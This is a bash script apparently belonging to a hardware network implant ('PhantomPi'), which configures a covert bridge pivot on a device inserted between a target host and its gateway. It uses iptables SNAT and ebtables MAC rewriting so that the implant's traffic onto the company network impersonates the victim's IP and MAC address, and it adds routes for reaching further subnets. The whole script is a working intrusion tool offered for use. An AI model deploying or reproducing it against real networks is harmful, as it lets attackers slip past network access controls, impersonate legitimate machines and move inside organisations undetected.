#!/bin/bash

set -euo pipefail
[ -f /opt/implant/config.env ] && source /opt/implant/config.env

BRIDGE="${BRIDGE:-br0}"
IFACE_COMPANY="${IFACE_COMPANY:-eth0}"
PIVOT_CONNTRACK_IP="${PIVOT_CONNTRACK_IP:-169.254.66.66/16}"
PIVOT_CONNTRACK_GW="${PIVOT_CONNTRACK_GW:-169.254.66.1}"
PIVOT_SNAT_PORT_RANGE="${PIVOT_SNAT_PORT_RANGE:-61000-62000}"
PIVOT_ENABLE_ICMP="${PIVOT_ENABLE_ICMP:-no}"

NAT_CHAIN="PHANTOMPI_CT_NAT"
EBT_CHAIN="PHANTOMPI_CT_L2"
STATE_DIR="/run/phantompi-conntrack"
STATE_FILE="${STATE_DIR}/state.env"

usage() {
  cat <<EOF
Usage: pivot-conntrack <command> [options]

Commands:
  apply --target-ip IP --target-mac MAC --gateway-ip IP --gateway-mac MAC
  route-add CIDR
  route-del CIDR
  route-flush
  status
  clean
EOF
}

private_ip() {
  echo "${PIVOT_CONNTRACK_IP%%/*}"
}

need() {
  command -v "$1" >/dev/null 2>&1 || {
    echo "[!] missing command: $1" >&2
    exit 1
  }
}

load_state() {
  [ -f "$STATE_FILE" ] || return 0
  source "$STATE_FILE"
}

write_state() {
  sudo mkdir -p "$STATE_DIR"
  sudo tee "$STATE_FILE" >/dev/null <<EOF
TARGET_IP="$TARGET_IP"
TARGET_MAC="$TARGET_MAC"
GATEWAY_IP="$GATEWAY_IP"
GATEWAY_MAC="$GATEWAY_MAC"
BRIDGE_MAC="$BRIDGE_MAC"
BR_NF_CALL_IPTABLES_OLD="$BR_NF_CALL_IPTABLES_OLD"
EOF
}

clean() {
  load_state
  sudo ebtables -t nat -D POSTROUTING -j "$EBT_CHAIN" 2>/dev/null || true
  sudo ebtables -t nat -F "$EBT_CHAIN" 2>/dev/null || true
  sudo ebtables -t nat -X "$EBT_CHAIN" 2>/dev/null || true
  sudo iptables -t nat -D POSTROUTING -j "$NAT_CHAIN" 2>/dev/null || true
  sudo iptables -t nat -F "$NAT_CHAIN" 2>/dev/null || true
  sudo iptables -t nat -X "$NAT_CHAIN" 2>/dev/null || true
  sudo ip route flush dev "$BRIDGE" proto static 2>/dev/null || true
  sudo ip addr del "$PIVOT_CONNTRACK_IP" dev "$BRIDGE" 2>/dev/null || true
  sudo ip neigh del "$PIVOT_CONNTRACK_GW" dev "$BRIDGE" 2>/dev/null || true
  if [ -n "${BR_NF_CALL_IPTABLES_OLD:-}" ] && [ -e /proc/sys/net/bridge/bridge-nf-call-iptables ]; then
    echo "$BR_NF_CALL_IPTABLES_OLD" | sudo tee /proc/sys/net/bridge/bridge-nf-call-iptables >/dev/null || true
  fi
  sudo rm -f "$STATE_FILE"
  echo "[+] conntrack pivot cleaned"
}

status() {
  load_state
  echo "backend=conntrack-bridge"
  echo "bridge=$BRIDGE"
  echo "bridge_ip_ready=$(ip -4 addr show dev "$BRIDGE" | grep -q "$(private_ip)" && echo yes || echo no)"
  echo "iptables_ready=$(sudo iptables -t nat -S "$NAT_CHAIN" >/dev/null 2>&1 && echo yes || echo no)"
  echo "ebtables_ready=$(sudo ebtables -t nat -L "$EBT_CHAIN" >/dev/null 2>&1 && echo yes || echo no)"
  echo "br_netfilter_ready=$([ -e /proc/sys/net/bridge/bridge-nf-call-iptables ] && [ "$(cat /proc/sys/net/bridge/bridge-nf-call-iptables)" = "1" ] && echo yes || echo no)"
  echo "target_ip=${TARGET_IP:-}"
  echo "target_mac=${TARGET_MAC:-}"
  echo "gateway_ip=${GATEWAY_IP:-}"
  echo "gateway_mac=${GATEWAY_MAC:-}"
  ip route show dev "$BRIDGE" proto static 2>/dev/null || true
}

apply() {
  TARGET_IP=""
  TARGET_MAC=""
  GATEWAY_IP=""
  GATEWAY_MAC=""

  while [ "$#" -gt 0 ]; do
    case "$1" in
      --target-ip) TARGET_IP="$2"; shift 2 ;;
      --target-mac) TARGET_MAC="$2"; shift 2 ;;
      --gateway-ip) GATEWAY_IP="$2"; shift 2 ;;
      --gateway-mac) GATEWAY_MAC="$2"; shift 2 ;;
      *) echo "[!] unknown option: $1" >&2; usage; exit 1 ;;
    esac
  done

  [ -n "$TARGET_IP" ] || { echo "[!] --target-ip is required" >&2; exit 1; }
  [ -n "$TARGET_MAC" ] || { echo "[!] --target-mac is required" >&2; exit 1; }
  [ -n "$GATEWAY_IP" ] || { echo "[!] --gateway-ip is required" >&2; exit 1; }
  [ -n "$GATEWAY_MAC" ] || { echo "[!] --gateway-mac is required" >&2; exit 1; }

  need ip
  need iptables
  need ebtables

  clean >/dev/null
  sudo modprobe br_netfilter nf_conntrack 2>/dev/null || true
  [ -e /proc/sys/net/bridge/bridge-nf-call-iptables ] || {
    echo "[!] br_netfilter is unavailable" >&2
    exit 1
  }

  BR_NF_CALL_IPTABLES_OLD="$(cat /proc/sys/net/bridge/bridge-nf-call-iptables)"
  echo 1 | sudo tee /proc/sys/net/bridge/bridge-nf-call-iptables >/dev/null

  sudo ip addr add "$PIVOT_CONNTRACK_IP" dev "$BRIDGE" 2>/dev/null || true
  sudo ip neigh replace "$PIVOT_CONNTRACK_GW" lladdr "$GATEWAY_MAC" dev "$BRIDGE" nud permanent
  sudo ip route replace "$GATEWAY_IP" via "$PIVOT_CONNTRACK_GW" dev "$BRIDGE" src "$(private_ip)" proto static

  BRIDGE_MAC="$(cat "/sys/class/net/$BRIDGE/address")"

  sudo iptables -t nat -N "$NAT_CHAIN" 2>/dev/null || sudo iptables -t nat -F "$NAT_CHAIN"
  sudo iptables -t nat -C POSTROUTING -j "$NAT_CHAIN" 2>/dev/null || sudo iptables -t nat -A POSTROUTING -j "$NAT_CHAIN"
  sudo iptables -t nat -A "$NAT_CHAIN" -o "$BRIDGE" -s "$(private_ip)" -p tcp -j SNAT --to "$TARGET_IP:$PIVOT_SNAT_PORT_RANGE" --random-fully
  sudo iptables -t nat -A "$NAT_CHAIN" -o "$BRIDGE" -s "$(private_ip)" -p udp -j SNAT --to "$TARGET_IP:$PIVOT_SNAT_PORT_RANGE" --random-fully
  if [ "$PIVOT_ENABLE_ICMP" = "yes" ]; then
    sudo iptables -t nat -A "$NAT_CHAIN" -o "$BRIDGE" -s "$(private_ip)" -p icmp -j SNAT --to "$TARGET_IP"
  fi

  sudo ebtables -t nat -N "$EBT_CHAIN" 2>/dev/null || sudo ebtables -t nat -F "$EBT_CHAIN"
  sudo ebtables -t nat -L POSTROUTING 2>/dev/null | grep -q -- "-j $EBT_CHAIN" || sudo ebtables -t nat -A POSTROUTING -j "$EBT_CHAIN"
  sudo ebtables -t nat -A "$EBT_CHAIN" -s "$BRIDGE_MAC" -o "$IFACE_COMPANY" -j snat --to-src "$TARGET_MAC"

  write_state
  echo "[+] conntrack pivot applied"
}

route_add() {
  load_state
  [ -n "${GATEWAY_MAC:-}" ] || { echo "[!] pivot state missing; run apply first" >&2; exit 1; }
  sudo ip route replace "$1" via "$PIVOT_CONNTRACK_GW" dev "$BRIDGE" src "$(private_ip)" proto static
}

route_del() {
  sudo ip route del "$1" dev "$BRIDGE" proto static 2>/dev/null || true
}

route_flush() {
  sudo ip route flush dev "$BRIDGE" proto static 2>/dev/null || true
}

case "${1:-}" in
  apply) shift; apply "$@" ;;
  route-add) shift; [ "$#" -eq 1 ] || { usage; exit 1; }; route_add "$1" ;;
  route-del) shift; [ "$#" -eq 1 ] || { usage; exit 1; }; route_del "$1" ;;
  route-flush) route_flush ;;
  status) status ;;
  clean) clean ;;
  --help|-h|help|"") usage ;;
  *) echo "[!] unknown command: $1" >&2; usage; exit 1 ;;
esac
